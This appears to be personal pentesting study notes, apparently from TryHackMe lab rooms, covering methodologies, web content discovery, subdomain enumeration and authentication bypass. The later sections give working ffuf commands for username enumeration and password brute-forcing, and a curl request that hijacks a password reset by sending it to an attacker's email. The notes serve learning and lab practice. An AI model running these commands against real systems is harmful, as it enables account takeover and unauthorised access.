# Pentesting Fundamentals
Steps : 
1. Information gathering
2. Scanning
3. Exploitation
4. Privileges escalation
5. Post-exploitation

## ROE : Rules of Engagement
The document sumarizes pentester and client's agreements. There are 3 sections permission, test scope and rules.  
https://sansorg.egnyte.com/dl/bF4I3yCcnt/?

## OSSTMM : Open Source Security Testing Methodology Manual
The manual provides a large set of methodoly in order to test a system from certifications to testing strategies.  

it includes methodologies focused on telecommunication (voIP, phones), wired network and wireless network.

## OWASP : Open Web Application Security Project
Framework with scanners in order to test the security of a website  
https://owasp.org/

## NIST Cybersecurity framework
Popular framework really detailed, lower the risk of cyber threats.  
https://www.nist.gov/cyberframework

## Website content discovery
**robot.txt** is a file that provides to crawlers a list of forbidden endpoints. We may discover depositories with vulnerabilities.

The **favicon** by default gives us information about the framework used. The following database list the equivalence between favicon hash and framework https://wiki.owasp.org/index.php/OWASP_favicon_database.  
We can download and get fav md5 with 
>curl site/fav... | md5sum

Contrary to robot.txt the **sitemap.xml** file list what endpoint are authorized for crawlers. Still we may see hidden of difficult to get endpoint and even old sites that are forgotten.

**curl** address -v can shows programation language used or even the server's version.

**OSINT Wappalyser** : online, info of website structure.

**Wayback machine** : https://archive.org/web/ archive the web, we can discover old pages of a website.

**GIT** : we can research company name to access to a public repo and look at the source code and evently credentials.

**S3 buckets** : often http(s)://{name}.s3.amazonaws.com, we can get url from git repo. Maybe we can find files with opened permissions.

**dirb webAddress /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt** : take a list of files name and check if they exist. fuff and goBuster does the same.

## Subdomain enumeration
Thar art of looking for all subdomain allows us to have more attack surfaces. We  can find subdomains by using brute force, OSINT or virtual hosts.

**OSINT**
> There is a database that shows what domains are link to SSL/TLS certificates to figth against malicious certificats. Nevertheless we can use the database to find subdomains : http://crt.sh/ or https://ui.ctsearch.entrust.com/ui/ctsearchui

> Using google algorithme like -site:www.tryhackme.com  site:*.tryhackme.com

> Using the tool sublist3r   
./sublist3r.py -d domain

**Brute force**
> Using the tool dnsrecon : dnsrecon -t brt -d domain

## Authentification bypass
Firstly we have to list the usernames. We can find them by trying to sign in and check code responses with ffuf.

> ffuf -w fileDBname -X POST -d "username=FUZZ&email=x&password=x&cpassword=xETC" -H "Content-Type: application/x-www-form-urlencoded" -u address/signup -mr "username already exists" | cut -d " " -f1 > usernames.txt; cat usernames.txt

Knowwe can try to bruteforce passwords
> ffuf -w valid_usernames.txt:W1,passlist:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u address/login -fc 200 (because expect 302 found)

### Logic flaw
With curl we can send POST request with different content in the query string of the headers and the body. If a query string has the same name than a var in the body, PHP $request var will profit post informations. We can use it to reset account password.

>curl 'address/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@whatyouwant.com'

We can create an account and change de whatyouwant mail to personal customer service mail a recuperate the ticket